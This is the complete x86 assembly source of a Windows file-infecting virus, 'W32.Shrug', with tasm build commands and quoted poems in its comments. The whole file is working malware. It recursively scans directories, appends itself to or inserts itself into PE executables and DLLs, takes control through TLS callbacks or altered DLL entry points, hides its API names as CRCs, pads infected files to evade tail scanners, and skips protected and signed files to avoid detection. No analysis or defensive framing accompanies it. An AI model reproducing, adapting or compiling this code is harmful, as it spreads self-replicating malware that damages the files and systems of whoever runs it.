   ; comment ;)
   ; W32.Shrug by roy g biv
   ;
   ; some of its features:
   ; - parasitic direct action infector of PE exe/dll (but not looking at suffix)
   ; - infects files in current directory and all subdirectories
   ; - directory traversal is linked-list instead of recursive to reduce stack size
   ; - reloc section inserter/last section appender
   ; - mixture of EPO and standard transfer of control:
   ;         TLS infection (but runs only under NT/2000/XP)
   ;         altered entry point field in DLLs (all platforms)
   ;         code executes after ExitProcess() is called
   ; - auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
   ; - uses CRCs instead of API names
   ; - uses SEH for common code exit
   ; - section attributes are not always altered (virus is not self-modifying)
   ; - no infect files with data outside of image (eg self-extractors)
   ; - no infect files protected by SFC/SFP (including under Windows XP)
   ; - infected files are padded by random amounts to confuse tail scanners
   ; - uses SEH walker to find kernel address (no hard-coded addresses)
   ; - correct file checksum without using imagehlp.dll :) 100% correct algorithm
   ; - plus some new code optimisations that were never seen before
   ; ---
   ;
   ;   optimisation tip: Windows appends ".dll" automatically, so this works:
   ;         push "cfs"
   ;         push esp
   ;         call LoadLibraryA
   ; ---
   ;
   ; to build this thing:
   ; tasm
   ; ----
   ; tasm32 /ml /m3 shrug
   ; tlink32 /B:400000 /x shrug,,,import32
   ;
   ; Virus is not self-modifying, so no need to alter section attributes
   ; ---
   ;
   ; We're in the middle of a phase transition:
   ; a butterfly flapping its wings at
   ; just the right moment could
   ; cause a storm to happen.
   ; -I'm trying to understand-
   ; I'm at a moment in my life-
   ; I don't know where to flap my wings.
   ; (Danny Hillis)
   ;
   ; (;

   .386
   .model  flat

   extern  GetCurrentProcess:proc
   extern  WriteProcessMemory:proc
   extern  MessageBoxA:proc
   extern  ExitProcess:proc

   .data

   ;must be reverse alphabetical order because they are stored on stack
   ;API names are not present in replications, only in dropper

   krnnames        db      "UnmapViewOfFile"     , 0
                   db      "SetFileTime"         , 0
                   db      "SetFileAttributesW"  , 0
                   db      "SetFileAttributesA"  , 0
                   db      "SetCurrentDirectoryW", 0
                   db      "SetCurrentDirectoryA", 0
                   db      "MultiByteToWideChar" , 0
                   db      "MapViewOfFile"       , 0
                   db      "LoadLibraryA"        , 0
                   db      "GlobalFree"          , 0
                   db      "GlobalAlloc"         , 0
                   db      "GetVersion"          , 0
                   db      "GetTickCount"        , 0
                   db      "GetFullPathNameW"    , 0
                   db      "GetFullPathNameA"    , 0
                   db      "FindNextFileW"       , 0
                   db      "FindNextFileA"       , 0
                   db      "FindFirstFileW"      , 0
                   db      "FindFirstFileA"      , 0
                   db      "FindClose"           , 0
                   db      "CreateFileW"         , 0
                   db      "CreateFileMappingA"  , 0
                   db      "CreateFileA"         , 0
                   db      "CloseHandle"         , 0

   sfcnames        db      "SfcIsFileProtected", 0

   txttitle        db      "Shrug", 0
   txtbody         db      "running...", 0

   include shrug.inc

   .code
   assume fs:nothing

   dropper         label   near
           mov     edx, krncrc_count
           mov     ebx, offset krnnames
           mov     edi, offset krncrcbegin
           call    create_crcs
           mov     edx, 1
           mov     ebx, offset sfcnames
           mov     edi, offset sfccrcbegin
           call    create_crcs
           call    patch_host
           xor     ebx, ebx
           push    ebx
           push    offset txttitle
           push    offset txtbody
           push    ebx
           call    MessageBoxA
           push    ebx
           call    ExitProcess

   create_crcs     proc    near
           imul    ebp, edx, 4

   create_loop     label   near
           or      eax, -1

   create_outer    label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   create_inner    label   near
           add     eax, eax
           jnb     create_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   create_skip     label   near
           loop    create_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      create_outer
           push    eax
           dec     edx
           jne     create_loop
           mov     eax, esp
           push    ecx
           push    ebp
           push    eax
           push    edi
           call    GetCurrentProcess
           push    eax
           xchg    esi, eax
           call    WriteProcessMemory
           add     esp, ebp
           ret
   create_crcs     endp

   patch_host      label   near
           pop     ecx
           push    ecx
           call    $ + 5
           pop     eax
           add     eax, offset tlsdata - offset $ + 1
           sub     ecx, eax
           push    ecx
           mov     eax, esp
           xor     edi, edi
           push    edi
           push    4
           push    eax
           push    offset host_patch + 3
           push    esi
           call    WriteProcessMemory
           push    edi                             ;fake Reserved
           push    edi                             ;fake Reason
           push    edi                             ;fake DLLHandle
           push    edi                             ;fake return address
   ;-----------------------------------------------------------------------------
   ;everything before this point is dropper code
   ;-----------------------------------------------------------------------------

   ;-----------------------------------------------------------------------------
   ;virus code begins here in dlls (always) and exes (existing TLS callback pointer)
   ;-----------------------------------------------------------------------------

   shrug_tlscode   proc    near
           mov     eax, dword ptr [esp + initstk.initReason]
           push    eax                             ;fake Reserved
           push    eax                             ;real Reason
           push    eax                             ;fake DLLHandle
           call    host_patch                      ;real return address

   tlsdata         tlsstruc <0>                    ;label required for delta offset

   ;-----------------------------------------------------------------------------
   ;moved label after some data because "e800000000" looks like virus code ;)
   ;and it's not used for delta offset calculation, but for original entry point
   ;-----------------------------------------------------------------------------

   host_patch      label   near
           add     dword ptr [esp], '!bgr'

   ;-----------------------------------------------------------------------------
   ;virus code begins here in exes (created TLS directory / callback pointer)
   ;-----------------------------------------------------------------------------

   shrug_dllcode   proc    near                    ;stack = DllHandle, Reason, Reserved
           test    byte ptr [esp + initstk.initReason], DLL_PROCESS_ATTACH or DLL_THREAD_ATTACH
           jne     shrug_dllret                    ;kernel32 not in SEH chain on ATTACH messages
           pushad
           call    shrug_common
           mov     esp, dword ptr [esp + sehstruc.sehprevseh]
           xor     eax, eax
           pop     dword ptr fs:[eax]
           pop     eax
           popad

   shrug_dllret    label   near
           ret     0ch

   ;-----------------------------------------------------------------------------
   ;main virus body.  everything happens in here
   ;-----------------------------------------------------------------------------

   shrug_common    proc    near
           xor     esi, esi
           lods    dword ptr fs:[esi]
           push    eax
           mov     dword ptr fs:[esi - 4], esp
           inc     eax

   walk_seh        label   near
           dec     eax
           xchg    esi, eax
           lods    dword ptr [esi]
           inc     eax
           jne     walk_seh
           enter   (size findlist - 5) and -4, 0   ;Windows NT/2000/XP enables alignment check exception
                                                   ;so some APIs fail if buffer is not dword aligned
                                                   ;-5 to align at 2 dwords earlier
                                                   ;because EBP saved automatically
                                                   ;and other register saved next
           push    eax                             ;zero findprev in findlist
           lods    dword ptr [esi]
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (krncrc_count + 1) dup (0)
   krncrcend       label   near
           dd      offset check_sfc - offset krncrcend + 4
           db      "Shrug - roy g biv"             ;your guess is as good as mine

   init_findmz     label   near
           inc     eax
           xchg    edi, eax

   find_mzhdr      label   near

   ;-----------------------------------------------------------------------------
   ;do not use hard-coded kernel address values because it is not portable
   ;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
   ;they will maybe change again for every new release
   ;-----------------------------------------------------------------------------

           dec     edi                             ;sub 64kb
           xor     di, di                          ;64kb align
           call    is_pehdr
           jne     find_mzhdr
           mov     ebx, edi
           pop     edi

   ;-----------------------------------------------------------------------------
   ;parse export table
   ;-----------------------------------------------------------------------------

           mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
           lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
           lods    dword ptr [esi]                 ;Export Address Table RVA
           lea     edx, dword ptr [ebx + eax]
           lods    dword ptr [esi]                 ;Name Pointer Table RVA
           lea     ecx, dword ptr [ebx + eax]
           lods    dword ptr [esi]                 ;Ordinal Table RVA
           lea     ebp, dword ptr [ebx + eax]
           mov     esi, ecx

   push_export     label   near
           push    ecx

   get_export      label   near
           lods    dword ptr [esi]
           push    ebx
           add     ebx, eax                        ;Name Pointer VA
           or      eax, -1

   crc_outer       label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   crc_inner       label   near
           add     eax, eax
           jnb     crc_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   crc_skip        label   near
           loop    crc_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      crc_outer
           pop     ebx
           cmp     dword ptr [edi], eax
           jne     get_export

   ;-----------------------------------------------------------------------------
   ;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
   ;this allows to push addresses onto the stack, and the order is known
   ;-----------------------------------------------------------------------------

           pop     ecx
           mov     eax, esi
           sub     eax, ecx                        ;Name Pointer Table VA
           shr     eax, 1
           movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
           mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
           add     eax, ebx
           push    eax
           scas    dword ptr [edi]
           cmp     dword ptr [edi], 0
           jne     push_export
           add     edi, dword ptr [edi + 4]
           jmp     edi

   ;-----------------------------------------------------------------------------
   ;get SFC support if available
   ;-----------------------------------------------------------------------------

   check_sfc       label   near
           call    load_sfc
           db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

   load_sfc        label   near
           call    dword ptr [esp + krncrcstk.kLoadLibraryA]
           test    eax, eax
           jne     found_sfc
           push    'cfs'                           ;Windows Me/2000
           push    esp
           call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
           pop     ecx
           test    eax, eax
           je      sfcapi_push

   found_sfc       label   near
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      0, 0
   sfccrcend       label   near
           dd      offset swap_create - offset sfccrcend + 4

   sfcapi_push     label   near
           push    eax

   swap_create     label   near

   ;-----------------------------------------------------------------------------
   ;swap CreateFileW and CreateFileMappingA because of alphabet order
   ;-----------------------------------------------------------------------------

           mov     ebx, esp
           mov     eax, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
           xchg    dword ptr [ebx + krncrcstk.kCreateFileW], eax
           mov     dword ptr [ebx + krncrcstk.kCreateFileMappingA], eax

   ;-----------------------------------------------------------------------------
   ;determine platform and dynamically select function types (ANSI or Unicode)
   ;so for Windows NT/2000/XP this code handles files that no ANSI function can open
   ;-----------------------------------------------------------------------------

           call    dword ptr [ebx + krncrcstk.kGetVersion]
           shr     eax, 1fh                        ;treat 9x and Win32s as ANSI
                                                   ;safer than using AreFileApisANSI()
           lea     ebp, dword ptr [eax * 4 + ebx]
           lea     esi, dword ptr [ebx + size krncrcstk]

   ;-----------------------------------------------------------------------------
   ;non-recursive directory traverser
   ;-----------------------------------------------------------------------------

   scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
           push    '*'                             ;ANSI-compatible Unicode findmask
           mov     eax, esp
           lea     ebx, dword ptr [esi + findlist.finddata]
           push    ebx
           push    eax
           call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
           pop     ecx
           mov     dword ptr [esi + findlist.findhand], eax
           inc     eax
           je      find_prev

           ;you must always step forward from where you stand

   test_dirfile    label   near
           mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
           lea     edi, dword ptr [esi + findlist.finddata.cFileName]
           test    al, FILE_ATTRIBUTE_DIRECTORY
           je      test_file
           cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
           je      find_next

   ;-----------------------------------------------------------------------------
   ;enter subdirectory, and allocate another list node
   ;-----------------------------------------------------------------------------

           push    edi
           call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
           xchg    ecx, eax
           jecxz   find_next
           push    size findlist
           push    GMEM_FIXED
           call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
           xchg    ecx, eax
           jecxz   step_updir
           xchg    esi, ecx
           mov     dword ptr [esi + findlist.findprev], ecx
           jmp     scan_dir

   find_next       label   near
           lea     ebx, dword ptr [esi + findlist.finddata]
           push    ebx
           mov     edi, dword ptr [esi + findlist.findhand]
           push    edi
           call    dword ptr [ebp + krncrcstk.kFindNextFileW]
           test    eax, eax
           jne     test_dirfile

   ;-----------------------------------------------------------------------------
   ;close find, and free list node if not list head
   ;-----------------------------------------------------------------------------

           mov     ebx, esp
           push    edi
           call    dword ptr [ebx + krncrcstk.kFindClose]

   find_prev       label   near
           mov     ecx, dword ptr [esi + findlist.findprev]
           jecxz   shrug_exit
           push    esi
           mov     esi, ecx
           call    dword ptr [ebx + krncrcstk.kGlobalFree]

   step_updir      label   near

   ;-----------------------------------------------------------------------------
   ;the ANSI string ".." can be used, even on Unicode platforms
   ;-----------------------------------------------------------------------------

           push    '..'
           org     $ - 1                           ;select top 8 bits of push
   shrug_exit      label   near
           int     3                               ;game over

           push    esp
           call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
           pop     eax
           jmp     find_next

   test_file       label   near

   ;-----------------------------------------------------------------------------
   ;get full path and convert to Unicode if required (SFC requires Unicode path)
   ;-----------------------------------------------------------------------------

           push    eax                             ;save original file attributes for close
           mov     eax, ebp
           enter   MAX_PATH * 2, 0
           mov     ecx, esp
           push    eax
           push    esp
           push    ecx
           push    MAX_PATH
           push    edi
           call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
           xchg    edi, eax
           pop     eax
           xor     ebx, ebx
           call    dword ptr [ebp + 8 + krncrcstk.kGetVersion]
           test    eax, eax
           jns     call_sfcapi
           mov     ecx, esp
           xchg    ebp, eax
           enter   MAX_PATH * 2, 0
           xchg    ebp, eax
           mov     eax, esp
           push    MAX_PATH
           push    eax
           inc     edi
           push    edi
           push    ecx
           push    ebx                             ;use default translation
           push    ebx                             ;CP_ANSI
           call    dword ptr [ebp + 8 + krncrcstk.kMultiByteToWideChar]

   call_sfcapi     label   near

   ;-----------------------------------------------------------------------------
   ;don't touch protected files
   ;-----------------------------------------------------------------------------

           mov     ecx, dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
           xor     eax, eax                        ;fake success in case of no SFC
           jecxz   leave_sfc
           push    esp
           push    ebx
           call    ecx

   leave_sfc       label   near
           leave
           test    eax, eax
           jne     restore_attr
           call    set_fileattr
           push    ebx
           push    ebx
           push    OPEN_EXISTING
           push    ebx
           push    ebx
           push    GENERIC_READ or GENERIC_WRITE
           push    edi
           call    dword ptr [ebp + krncrcstk.kCreateFileW]
           xchg    ebx, eax
           call    test_infect
           db      81h                             ;mask CALL
           call    infect_file                     ;Super Nashwan power ;)

   close_file      label   near                    ;label required for delta offset
           lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
           push    eax
           sub     eax, 8
           push    eax
           sub     eax, 8
           push    eax
           push    ebx
           call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
           push    ebx
           call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]

   restore_attr    label   near
           pop     ebx                             ;restore original file attributes
           call    set_fileattr
           jmp     find_next
   scan_dir        endp

   ;-----------------------------------------------------------------------------
   ;look for MZ and PE file signatures
   ;-----------------------------------------------------------------------------

   is_pehdr        proc    near                    ;edi -> map view
           cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
           jne     pehdr_ret
           mov     esi, dword ptr [edi + mzhdr.mzlfanew]
           add     esi, edi
           lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
           add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

   pehdr_ret       label   near
           ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
   is_pehdr        endp

   ;-----------------------------------------------------------------------------
   ;reset/set read-only file attribute
   ;-----------------------------------------------------------------------------

   set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
           push    ebx
           lea     edi, dword ptr [esi + findlist.finddata.cFileName]
           push    edi
           call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
           ret                                     ;edi -> filename
           db      "01/01/01"                      ;01 Janvier, 1901 - the old joke
   set_fileattr    endp

   ;-----------------------------------------------------------------------------
   ;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
   ;-----------------------------------------------------------------------------

   test_infect     proc    near                    ;esi = find data, edi = map view, ebp -> platform APIs
           call    map_view
           mov     ebp, esi
           call    is_pehdr
           jne     inftest_ret
           lods    dword ptr [esi]
           cmp     ax, IMAGE_FILE_MACHINE_I386
           jne     inftest_ret                     ;only Intel 386+
           shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
           lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
           mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

   ;-----------------------------------------------------------------------------
   ;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
   ;-----------------------------------------------------------------------------

           test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
           jne     inftest_ret
           add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate

   ;-----------------------------------------------------------------------------
   ;if file is a .dll, then we require an entry point function
   ;-----------------------------------------------------------------------------

           lods    dword ptr [esi]
           xchg    ecx, eax
           test    ah, IMAGE_FILE_DLL shr 8
           je      test_system
           jecxz   inftest_ret

   ;-----------------------------------------------------------------------------
   ;32-bit executable file...
   ;-----------------------------------------------------------------------------

   test_system     label   near
           and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
           cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
           jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

   ;-----------------------------------------------------------------------------
   ;the COFF magic value is not checked because Windows ignores it anyway
   ;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
   ;-----------------------------------------------------------------------------

           mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
           cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
           jnbe    inftest_ret
           cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
           jb      inftest_ret
           shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
           jb      inftest_ret

   ;-----------------------------------------------------------------------------
   ;avoid files which seem to contain attribute certificates
   ;because one of those certificates might be a digital signature
   ;-----------------------------------------------------------------------------

           cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], 0
           jne     inftest_ret

   ;-----------------------------------------------------------------------------
   ;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
   ;the Optional Header can be larger than the offset of the last directory
   ;remember: even if you have not seen it does not mean that it does not happen :)
   ;-----------------------------------------------------------------------------

           movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
           add     eax, edx
           lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
           lods    dword ptr [esi]
           add     eax, dword ptr [esi]
           cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
           jne     inftest_ret                     ;file contains appended data
           inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                   ;skip call mask

   inftest_ret     label   near
           int     3

   ;-----------------------------------------------------------------------------
   ;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
   ;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
   ;-----------------------------------------------------------------------------

   open_append     proc    near
           call    dword ptr [esp + size mapstack - 4 + krncrcstk.kGetTickCount]
           and     eax, RANDPADMAX - 1
           add     ax, small (offset shrug_codeend - offset shrug_tlscode + RANDPADMIN)

   ;-----------------------------------------------------------------------------
   ;create file map, and map view if successful
   ;-----------------------------------------------------------------------------

   map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi -> findlist, ebp -> platform APIs
           add     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
           xor     ecx, ecx
           push    eax
           mov     edx, esp
           push    eax                             ;MapViewOfFile
           push    ecx                             ;MapViewOfFile
           push    ecx                             ;MapViewOfFile
           push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
           push    ecx
           push    eax
           push    ecx
           push    PAGE_READWRITE
           push    ecx
           push    ebx
           call    dword ptr [edx + size mapstack + krncrcstk.kCreateFileMappingA]
                                                   ;ANSI map is allowed because of no name
           push    eax
           xchg    edi, eax
           call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
           pop     ecx
           xchg    edi, eax                        ;should succeed even if file cannot be opened
           pushad
           call    unmap_seh
           mov     esp, dword ptr [esp + sehstruc.sehprevseh]
           xor     eax, eax
           pop     dword ptr fs:[eax]
           pop     eax
           popad                                   ;SEH destroys all registers
           push    eax
           push    edi
           call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
           call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
           pop     eax
           ret

   unmap_seh       proc    near
           cdq
           push    dword ptr fs:[edx]
           mov     dword ptr fs:[edx], esp
           jmp     dword ptr [esp + mapsehstk.mapsehsehret]
   unmap_seh       endp
   map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
   open_append     endp

   ;-----------------------------------------------------------------------------
   ;infect file using a selection of styles for variety
   ;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
   ;               bytes) to confuse scanners that look at end of file (also
   ;               infection marker)
   ;               if reloc table is not in last section (taken from relocation
   ;               field in PE header, not section name), then append to last
   ;               section.  otherwise, move relocs down and insert code into
   ;               space (to confuse people looking at end of file.  they will
   ;               see only relocation data and garbage or many zeroes)
   ;DLL infection: entry point is altered to point to virus code.  very simple
   ;EXE infection: Entry Point Obscured via TLS callback function
   ;               if no TLS directory exists, then one will be created, with a
   ;               single callback function that points to this code
   ;               if a TLS directory exists, but no callback functions exist,
   ;               then a function pointer will be created that points to this
   ;               code
   ;               else if a TLS directory and callback functions exist, then the
   ;               first function pointer will be altered to point to this code
   ;-----------------------------------------------------------------------------

   infect_file     label   near                    ;esi -> findlist, edi = map view
           call    open_append

   delta_label     label   near
           push    ecx
           push    edi
           mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
           lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
           movzx   eax, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum]
           imul    eax, eax, size pesect
           movzx   ecx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
           add     eax, ecx
           lea     esi, dword ptr [ebx + eax + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
           lods    dword ptr [esi]
           mov     cx, offset shrug_codeend - offset shrug_tlscode
           mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
           push    eax
           add     eax, ecx
           dec     edx
           add     eax, edx
           not     edx
           and     eax, edx                        ;file align last section
           mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

   ;-----------------------------------------------------------------------------
   ;raw size is file aligned.  virtual size is not required to be section aligned
   ;so if old virtual size is larger than new raw size, then size of image does
   ;not need to be updated, else virtual size must be large enough to cover the
   ;new code, and size of image is section aligned
   ;-----------------------------------------------------------------------------

           mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
           cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
           jnb     test_reloff
           mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
           add     eax, ebp
           mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
           dec     edx
           add     eax, edx
           not     edx
           and     eax, edx
           mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

   ;-----------------------------------------------------------------------------
   ;if relocation table is not in last section, then append to last section
   ;otherwise, move relocations down and insert code into space
   ;-----------------------------------------------------------------------------

   test_reloff     label   near
           test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
           jne     copy_code
           cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
           jb      copy_code
           mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
           add     eax, ebp
           cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
           jnb     copy_code
           add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
           pop     eax
           push    esi
           add     edi, dword ptr [esi]
           lea     esi, dword ptr [edi + eax - 1]
           lea     edi, dword ptr [esi + ecx]
           xchg    ecx, eax
           std
           rep     movs byte ptr [edi], byte ptr [esi]
           cld
           pop     esi
           pop     edi
           push    edi
           push    ecx
           xchg    ecx, eax

   copy_code       label   near
           pop     edx
           add     ebp, edx
           xchg    ebp, eax
           add     edx, dword ptr [esi]
           add     edi, edx
           push    esi
           push    edi
           mov     esi, offset shrug_tlscode - offset delta_label
           add     esi, dword ptr [esp + infectstk.infseh.mapsehinfret]
                                                   ;delta offset
           rep     movs byte ptr [edi], byte ptr [esi]
           pop     edi
           pop     esi

   ;-----------------------------------------------------------------------------
   ;always alter entry point of dlls
   ;-----------------------------------------------------------------------------

           test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum + 1], IMAGE_FILE_DLL shr 8
           je      test_tlsdir
           lea     edx, dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum]

   alter_func      label   near
           xchg    dword ptr [edx], eax
           sub     eax, offset tlsdata - offset shrug_tlscode
           sub     eax, dword ptr [edx]
           mov     dword ptr [edi + offset host_patch - offset shrug_tlscode + 3], eax
           jmp     checksum_file

   ;-----------------------------------------------------------------------------
   ;if tls directory exists...
   ;-----------------------------------------------------------------------------

   test_tlsdir     label   near
           mov     ecx, dword ptr [ebx + pehdr.petls.dirrva - pehdr.pechksum]
           jecxz   add_tlsdir                      ;size field is never checked
           call    rva2raw
           pop     edx
           push    edx
           add     eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
           push    eax
           lea     eax, dword ptr [edx + ecx + tlsstruc.tlsfuncptr]
           mov     ecx, dword ptr [eax]
           jecxz   store_func
           sub     ecx, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
           call    rva2raw
           add     edx, ecx                        ;do not combine
           mov     ecx, dword ptr [edx]            ;current edx used by alter_func

           ;it is impossible if it passes unattempted

   store_func      label   near
           test    ecx, ecx
           pop     ecx
           xchg    ecx, eax
           jne     alter_func
           add     eax, offset tlsdata.tlsfunc - offset shrug_tlscode
           mov     dword ptr [ecx], eax
           add     edi, offset tlsdata.tlsfiller - offset shrug_tlscode
           jmp     set_funcptr

   ;-----------------------------------------------------------------------------
   ;the only time that the section attributes are altered is when a TLS directory
   ;is created.  at that time, a writable dword must be available for the index.
   ;the alternative is to search for a writable section with virtual size > raw
   ;size, set index pointer to that address and reinitialise it to zero in code
   ;-----------------------------------------------------------------------------

   add_tlsdir      label   near
           or      byte ptr [esi + pesect.sectflags - pesect.sectrawaddr + 3], IMAGE_SCN_MEM_WRITE shr 18h
           add     eax, offset tlsdata - offset shrug_tlscode
           mov     dword ptr [ebx + pehdr.petls.dirrva - pehdr.pechksum], eax
           add     eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
           add     eax, offset tlsdata.tlsflags - offset tlsdata
           add     edi, offset tlsdata.tlsindex - offset shrug_tlscode
           stos    dword ptr [edi]
           add     eax, offset tlsdata.tlsfunc - offset tlsdata.tlsflags
           stos    dword ptr [edi]

   set_funcptr     label   near
           scas    dword ptr [edi]
           scas    dword ptr [edi]
           add     eax, offset shrug_dllcode - offset tlsdata.tlsfunc
           stos    dword ptr [edi]

   checksum_file   label   near
           pop     edi

   ;-----------------------------------------------------------------------------
   ;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
   ;-----------------------------------------------------------------------------

           xor     ecx, ecx
           xchg    dword ptr [ebx], ecx
           jecxz   infect_ret
           xor     eax, eax
           pop     ecx
           push    ecx
           inc     ecx
           shr     ecx, 1
           clc

   calc_checksum   label   near
           adc     ax, word ptr [edi]
           inc     edi
           inc     edi
           loop    calc_checksum
           pop     dword ptr [ebx]
           adc     dword ptr [ebx], eax            ;avoid common bug.  ADC not ADD

   infect_ret      label   near
           int     3                               ;common exit using SEH
           db      "*4U2NV*"                       ;that is, unless you're reading this
   test_infect     endp

   ;-----------------------------------------------------------------------------
   ;convert relative virtual address to raw file offset
   ;-----------------------------------------------------------------------------

   rvaloop         label   near
           sub     esi, size pesect
           cmp     al, 'R'                         ;mask PUSH ESI
           org     $ - 1
   rva2raw         proc    near                    ;ecx = RVA, esi -> last section header
           push    esi
           cmp     dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
           jnbe    rvaloop
           sub     ecx, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
           add     ecx, dword ptr [esi]
           pop     esi
           ret
   rva2raw        endp

           ;When last comes to last,
           ;  I have little power:
           ;  I am merely an urn.
           ;I hold the bone-sap of myself,
           ;  And watch the marrow burn.
           ;
           ;When last comes to last,
           ;  I have little strength:
           ;  I am only a tool.
           ;I work its work; and in its hands
           ;  I am the fool.
           ;
           ;When last comes to last,
           ;  I have little life.
           ;  I am simply a deed:
           ;an action done while courage holds:
           ;  A seed.
           ;(Stephen Donaldson)

   shrug_codeend   label   near
   shrug_common    endp
   shrug_dllcode   endp
   shrug_tlscode   endp
   end             dropper
